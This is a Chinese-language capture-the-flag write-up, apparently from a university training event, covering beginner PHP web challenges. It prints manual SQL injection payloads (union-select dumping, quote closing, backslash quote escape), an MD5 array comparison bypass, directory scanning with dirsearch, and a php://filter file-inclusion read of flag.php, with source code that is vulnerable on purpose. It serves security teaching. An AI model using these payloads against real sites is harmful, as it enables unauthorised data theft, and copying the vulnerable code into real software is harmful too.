# 按F12进入

这里我禁用了右键, 禁用代码如下

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190902233955.png)

我们可以通过F12查看源码

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190902234129.png)

当然你也可以在url前面加入

```
view-source:http://111.231.101.223:2019/
```

这样来查看源码

如果你使用`vimium`插件的话, 还可以通过快捷键`gs`查看源码

# phpStudy

phpStudy是我们常用的搭建环境的工具, 十分强大, 关键在于他提供了完整的`apache/nginx + php + mysql`的环境, 并且可以直接切换php版本, 对我们学习不同的php版本之间的差异有很大的帮助

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190902234711.png)

这里我们可以选择php7来搭建环境

> 推荐使用php7的原因是现在越来越多的题目都会基于php7

下载附件后放到phpstudy的WWW目录, 默认在

```
C:\phpStudy\PHPTutorial\WWW
```

然后访问

```
127.0.0.1
```

即可获得flag

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190902235120.png)

如果需要切换网站目录的话

```
其他选项菜单- 软件设置- 端口常规设置- 网站目录
```

更改后应用, 如果没有生效就再点一下重启



# unserialize1

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190902235344.png)

web中很常见的代码审计题目, 这里我们可以看到, 如果要包含`flag.php`的话, 需要满足

```php
isset($_GET['key']) && $s == unserialize($_GET['key'])
```

其中

```php
$s = "hhhhh";
```

由于有个`unserialize`, 我们可以构造exp如下

```php
<?php
$s = "hhhhh";
echo(serialize($s));
```

输出为

```
s:5:"hhhhh";
```

然后访问即可

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190903000150.png)

这里讲个知识点是php其实有类似于python的命令行模式, 启动方式是在终端

```
$ php -a
```

然后就可以像python那样直接写代码了, 不过它不会默认输出, 我们可以加个`echo`在前面

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190903000357.png)



# robots

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190903000820.png)

这里考察的是`robots.txt`的文件泄露, 这个文件用于搜索引擎爬取页面的时候, 规定爬取的规则

在做题的时候, 我们可以使用扫描器对题目扫一下

win下可以使用御剑

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190903001022.png)

我比较常用的是一款python编写的扫描器, https://github.com/maurosoria/dirsearch

使用方法如下

```
$ python3 ./dirsearch.py -u http://xxxx -e php
```

后面的-e参数可以根据题目情况修改, 如何识别一道题是用的什么环境呢

在chrome下安装这个插件, 即可查看大部分的题目后端语言

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190903001256.png)

扫出来后内容如下

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190903001354.png)

直接访问即可拿到flag



# baby_sqli

这里只给手注 payload ，sqlmap 的自己网上找

```
http://111.231.101.223:10003/?id=1' order by 2#
# no error

http://111.231.101.223:10003/?id=' union select 1,2#
# show 1

http://111.231.101.223:10003/?id=' union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#
# show flag

http://111.231.101.223:10003/?id=' union select group_concat(column_name),2 from information_schema.columns where table_name='flag'#
# show id,flag

http://111.231.101.223:10003/?id=' union select group_concat(flag),2 from flag#
# show kap0k{5q1map_1s_The_B3st_+ool}
```

# 你的引号呢

打开有源码提示 `index.kk`

```php
<?php

  if($_POST['user'] && $_POST['pass']) {
    $conn = mysqli_connect($host, $username, $password) or die("could not connect:".mysqli_connect_error());
    mysqli_select_db($conn, $database_name) or die('can not use:'.mysqli_error($conn));

    $user = trim($_POST['user']);
    $pass = md5(trim($_POST['pass']));

    $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
    // echo '</br>'.$sql;
    $query = mysqli_fetch_array(mysqli_query($conn, $sql));

    if($query[user]=="admin") {
      echo "<p>Logged in! flag: kap0k{**************************} </p>";
    }
    if($query[user] != "admin") {
      echo "<p>You are not admin!</p>";
    }
  }else{
      echo "<script>alert('username or password can not be null!')</script>";
  }
```

直接在 user 那里闭合就好，payload

```
POST
user=admin')#&pass=kk
# kap0k{Mayb3_md5_1s_vnuseful}
```

# ez_sqli

题目提示源码泄露，爆破目录后发现 index.php.swp

```php
<?php

  function clean($str){
    if(get_magic_quotes_gpc()){
      $str=stripslashes($str);
    }
    return htmlentities($str, ENT_QUOTES);
  }

  $username = @clean($_POST['user']);
  $password = @clean($_POST['pass']);

  $query="SELECT * FROM ctf WHERE user='".$username."' AND pw='".$password."';";

  $result=mysqli_query($conn, $query);

  if(!$result || mysqli_num_rows($result) < 1){
    echo "<script>alert('Invalid password!');</script>";
  } else{
    echo $flag;
  }
>
```

单引号逃逸，过滤了引号，但是 username 和 password 都用了单引号包含

payload

```
POST
user=\&pass=||1#
# kap0k{5ingl3_9uo+e_Esca@pe_1s_s0_phunny}
```

# 脆弱的MD5()

环境：Apache2+php5.6

打开题目可以发现这是一道典型的代码审计，题目源码已经显示在了网页上
```php
<?php
  error_reporting(0);
  include "fl3g.php";
  highlight_file(__file__);
  if(isset($_GET["usr"]) && isset($_GET["pwd"])){
    $usr = $_GET["usr"];
    $pwd = $_GET["pwd"];
    if(md5($usr) == md5($pwd) && $usr!=$pwd){
      echo $flag;
    } 
    else{
      echo "Try Again";
    }
  }
?>
```
题目的关键就在于

```php
if(md5($usr) == md5($pwd) && $usr!=$pwd){
      echo $flag;
    } 
```

这里需要用到php中md5()这个函数的一个漏洞，当传入的参数为数组时，该函数会直接返回false，所以这道题的思路就是构造一个数组，数组中的元素不相等即可绕过md5()

payload：

```
GET
http://http://47.96.230.108:2333/usr[]=1&pwd[]=2
```

# include

打开网页发现一句话

```
Flag is not here.Flag is in flag.php
```

那就访问一下flag.php，又是一句话

```
Flag is here
```

好像没有什么提示

这个给时候就要结合题目本身给的信息了，使用搜索引擎还是一个好习惯

```
什么？你说你不知道php的include()是什么？你也不知道文件包含漏洞是什么？你也不知道什么是php伪协议？好了现在你都知道了XD
```

那么这道题的keypoint就在于使用php的文件包含漏洞，利用php伪协议来读取服务器上文件的内容

这里放一个参考链接：<https://blog.csdn.net/qq_41289254/article/details/81388343>

里面对于细节的解释还是蛮清楚的，希望你们都能看看，这道题其实挺简单的，但是主要要学习的是里面包含的知识点

payload：

```
GET
http://http://47.96.230.108:2334/?file=php://filter/read=convert.base64-encode/resource=flag.php
```

得到一串base64编码的字符串

```
PGh0bWw+Cjxib2R5PgogICAgPGgyPkZsYWcgaXMgaGVyZTwvaDI+CjwvYm9keT4KPC9odG1sPgo8P3BocAogIC8vJGZsYWcgPSAia2FwMGt7TGZpX3cxdGhfUGhwX0YxbHRlcl8xc19GdW59IjsKPz4K
```

随便找个地方丢去解密，可以发现这就是flag.php的源码

```php+HTML
<html>
<body>
    <h2>Flag is here</h2>
</body>
</html>
<?php
  //$flag = "kap0k{Lfi_w1th_Php_F1lter_1s_Fun}";
?>
```